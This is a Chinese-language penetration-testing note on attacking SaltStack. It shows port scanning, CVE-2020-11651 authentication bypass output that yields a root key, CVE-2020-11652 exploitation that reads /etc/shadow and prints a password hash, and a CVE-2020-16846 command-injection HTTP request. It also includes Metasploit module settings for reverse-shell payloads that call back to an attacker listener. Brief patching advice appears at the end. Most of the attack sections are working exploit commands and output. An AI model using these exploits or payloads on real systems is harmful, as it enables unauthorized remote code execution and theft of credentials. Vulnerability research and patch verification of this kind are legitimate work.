---
title: SaltStack
category:
- [Kali, Exploit]

tags:
  - null
date: 2020-12-04 20:23:00
top:
updated:
---
SaltStack 是基于 Python 开发的一套C/S架构配置管理工具,是一个服务器基础架构集中化管理平台，具备配置管理，远程执行，监控等功能。

- `4505/4506` SaltStack Master与minions通信的端口
- `8000` 这是Salt的API端口,需要通过https访问

## 信息收集
```
 nmap -Pn -T4  -sV -p 4505,4506,8000 192.168.79.28
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 12:30 CST
Nmap scan report for 192.168.79.28
Host is up (0.00021s latency).

PORT     STATE SERVICE  VERSION
4505/tcp open  zmtp     ZeroMQ ZMTP 2.0
4506/tcp open  zmtp     ZeroMQ ZMTP 2.0
8000/tcp open  ssl/http CherryPy wsgiserver

```


## SaltStack水平权限绕过漏洞 CVE-2020-11651
----

在 CVE-2020-11651 认证绕过漏洞中，  
      攻击者通过构造恶意请求，  
                 可以绕过 Salt Master 的验证逻辑，  
                  调用相关未授权函数功能，  
从而可以造成远程命令执行漏洞。

影响版本：
 * SaltStack < 2019.2.4
 * SaltStack < 3000.2


### [CVE-2020-11651-poc](https://github.com/askDing/CVE-2020-11651-poc)验证
```
root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Salt version: 3000.1
[ ] This version of salt is vulnerable! Check results below
[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=
root@kalimah:~/salt#
```
### MSF漏洞利用
```
Module options (exploit/linux/misc/saltstack_salt_unauth_rce):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   MINIONS   .*               yes       PCRE regex of minions to target
   RHOSTS    10.190.26.13     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   ROOT_KEY                   no        Master's root key if you have it
   RPORT     4506             yes       The target port (TCP)
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   8080             yes       The local port to listen on.
   SSL       false            no        Negotiate SSL for incoming connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                    no        The URI to use for this exploit (default is random)


Payload options (python/meterpreter/reverse_https):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.79.28    yes       The local listener hostname
   LPORT  8443             yes       The local listener port
   LURI                    no        The HTTP Path
```



### 漏洞修复
* SaltStack官方已发布最新版本修复了上述漏洞，建议相关用户及时更新规避风险。https://github.com/saltstack/salt/releases
* 禁止将Salt Master默认监听端口（4505、4506）向公网开放，并设置为仅对可信对象开放。

[参考]
[SaltStack认证绕过漏洞](https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-11651)
[SaltStack认证绕过](https://mp.weixin.qq.com/s/k2ClnCQdBi0FoId7hrRQNw)


## SaltStack任意文件读取 CVE-2020-11652
攻击者可构造恶意请求，读取，写入服务器上任意文件

### [CVE-2020-11651-poc](https://github.com/askDing/CVE-2020-11651-poc)工具验证

[salt-securiy-backports](https://github.com/askDing/salt-security-backports.git)
也可验证
```
root@kalimah:~/salt# python2 exploit.py --master 192.168.115.130 -r /etc/shadow
[+] Salt version: 2019.2.0
[ ] This version of salt is vulnerable! Check results below
[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: GkJiProN36+iZ53buhvhm3dWcC/7BZyEomu3lSFucQF9TkrCRfA32EIFAk/yyQMkCyqZyxjjp/E=
[+] Attemping to read /etc/shadow from 192.168.115.130
root:$6$7qfolaa/$3yhszWj/VUJjfPaqr1yO6NLgV/FhHnVT9Pr6spwJ/F0BJw5vFM.3KjtwcnnuGo5uSJJkLrd28jXrmVZUD9nEI/:17812:0:99999:7:::
daemon:*:17785:0:99999:7:::
bin:*:17785:0:99999:7:::
sys:*:17785:0:99999:7:::
sync:*:17785:0:99999:7:::
games:*:17785:0:99999:7:::
man:*:17785:0:99999:7:::
[...]
```

## SaltStack命令注入漏洞 CVE-2020-16846

2020年11月SaltStack官方披露了CVE-2020-16846和CVE-2020-25592两个漏洞，
其中CVE-2020-25592允许任意用户调用SSH模块，
CVE-2020-16846允许用户执行任意命令。
组合这两个漏洞，将可以使未授权的攻击者通过Salt API执行任意命令。

### BurpSuite复测
```
POST /run HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/x-yaml
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|touch%20/tmp/success%3b

```
![saltstack-1](../images/saltstack-1.png)

### MSF复测

```

Module options (exploit/linux/http/saltstack_salt_api_cmd_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.190.75.23     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8000             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_python_ssl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.79.28    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

   